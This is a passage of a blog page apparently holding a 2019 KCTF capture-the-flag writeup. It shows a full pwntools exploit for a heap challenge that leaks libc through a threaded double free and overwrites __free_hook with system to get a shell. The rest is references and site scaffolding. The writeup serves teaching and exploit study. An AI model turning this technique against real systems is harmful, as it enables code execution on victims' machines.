pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">context(os = <span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">fastfree = ELF(<span class="string">'./fastheap'</span>)</span><br><span class="line">elf_libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line">p = process(<span class="string">'./fastheap'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Contents: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(indexRange,workers)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index range: '</span>)</span><br><span class="line">    p.sendline(indexRange)</span><br><span class="line">    p.recvuntil(<span class="string">'Number of workers: '</span>)</span><br><span class="line">    p.sendline(str(workers))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    <span class="keyword">return</span> p.recvline()[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#step 1 : leak libc addr</span></span><br><span class="line">    malloc(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">'0'</span>*<span class="number">8</span>+<span class="string">'\n'</span>)<span class="comment">#index 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">        malloc(i,<span class="number">0x60</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#end_index = 255,start_index = 250</span></span><br><span class="line">    <span class="comment">#two threads used to free</span></span><br><span class="line">    <span class="comment">#this will cause index of 0-254 will free again after free 250-254.</span></span><br><span class="line">    free(<span class="string">'250-255'</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span class="comment">#now index0 put into unsorted bin</span></span><br><span class="line">    <span class="comment">#index0'fd and bk point to main_arena_88,</span></span><br><span class="line">    <span class="comment">#free only clear heap_ptr[250-255]</span></span><br><span class="line">    <span class="comment">#so heap_ptr[0] is not null ,show(0)can leak libc addr</span></span><br><span class="line">    main_arena_offset = <span class="number">0x3ebca0</span></span><br><span class="line">    log.info(<span class="string">'main_arena_offset : '</span>+hex(main_arena_offset))</span><br><span class="line">    libc = u64(show(<span class="number">0</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - main_arena_offset</span><br><span class="line">    log.info(<span class="string">'libc base addr : '</span> + hex(libc) )</span><br><span class="line">    <span class="comment">#free(250-255)，只是将heap_ptr[250]~heap_ptr[254]中的指针清空了，但是0～249的指针没有被清空</span></span><br><span class="line">    free(<span class="string">'2-3'</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#fastbin[0x70]:2-&gt;1-&gt;2-&gt;3....-&gt;7-&gt;254-&gt;253-&gt;252-&gt;251-&gt;250......-&gt;8-&gt;250-&gt;251...-&gt;254</span></span><br><span class="line">    free_hook = elf_libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    <span class="comment">#log.info('free_hook'+hex(elf_libc.symbols['__free_hook']))</span></span><br><span class="line">    <span class="comment">#将heap_ptr[2]'fd指针改为free_hook指针。</span></span><br><span class="line">    <span class="comment">#fastbin:1-&gt;2-&gt;free_hook</span></span><br><span class="line">    malloc(<span class="number">2</span>,<span class="number">0x60</span>,p64(libc+free_hook)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="comment">#fastbin:2-&gt;free_hook</span></span><br><span class="line">    malloc(<span class="number">250</span>,<span class="number">0x60</span>,<span class="string">'/bin/sh\n'</span>)<span class="comment">#1</span></span><br><span class="line">    <span class="comment">#fastbin-&gt;free_hook</span></span><br><span class="line">    malloc(<span class="number">251</span>,<span class="number">0x60</span>,<span class="string">'/bin/sh\n'</span>)<span class="comment">#2</span></span><br><span class="line">    system_addr = elf_libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">    log.info(<span class="string">'system addr '</span>+ hex(system_addr))</span><br><span class="line">    <span class="comment">#heap_ptr[252]将分配到free_hook地址</span></span><br><span class="line">    malloc(<span class="number">252</span>,<span class="number">0x60</span>,p64(libc+system_addr)+<span class="string">'\n'</span>)</span><br><span class="line">    free(<span class="string">"250-252"</span>,<span class="number">2</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+<h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p>官方WP ： <a href="https://mp.weixin.qq.com/s/YbX5s2gJQaMbhDkLZJpl6A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/YbX5s2gJQaMbhDkLZJpl6A</a></p>
+<p>线程堆的分配释放 ：<a href="http://p4nda.top/2018/03/15/n1ctf2018/" target="_blank" rel="noopener">http://p4nda.top/2018/03/15/n1ctf2018/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    v1cky01dxp
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="https://v1ckydxp.github.io/archives/2019/07/09/2019_KCTF_绝地逃生_writeup/" title="2019 KCTF 绝地逃生 writeup">https://v1ckydxp.github.io/archives/2019/07/09/2019_KCTF_绝地逃生_writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://v1ckydxp.github.io" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn-UAF/" rel="tag"># pwn UAF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/07/House_Of_Einherjar--2016-Seccon-tinypad-writeup/" rel="next" title="House_Of_Einherjar - 2016 Seccon tinypad writeup">
+                <i class="fa fa-chevron-left"></i> House_Of_Einherjar - 2016 Seccon tinypad writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/10/自说自话-2019-7-10/" rel="prev" title="自说自话">
+                自说自话 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">v1cky01dxp</p>
+	      <img class="site-author-image" itemprop="image" src="/images/head.jpeg" alt="v1cky01dxp">
+	      <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/v1ckydxp" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:sunshinedxp@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#程序基本信息"><span class="nav-number">1.</span> <span class="nav-text">程序基本信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#程序逻辑"><span class="nav-number">2.</span> <span class="nav-text">程序逻辑</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#malloc"><span class="nav-number">2.1.</span> <span class="nav-text">malloc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fast-free"><span class="nav-number">2.2.</span> <span class="nav-text">fast free</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#start-routine"><span class="nav-number">2.3.</span> <span class="nav-text">start_routine</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用过程"><span class="nav-number">3.</span> <span class="nav-text">利用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-泄漏libc地址"><span class="nav-number">3.1.</span> <span class="nav-text">1. 泄漏libc地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-UAF，覆盖free-hook的地址为system-addr"><span class="nav-number">3.2.</span> <span class="nav-text">2. UAF，覆盖free_hook的地址为system_addr</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">4.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reference"><span class="nav-number">5.</span> <span class="nav-text">reference</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">v1cky01dxp</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">35.8k</span>
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
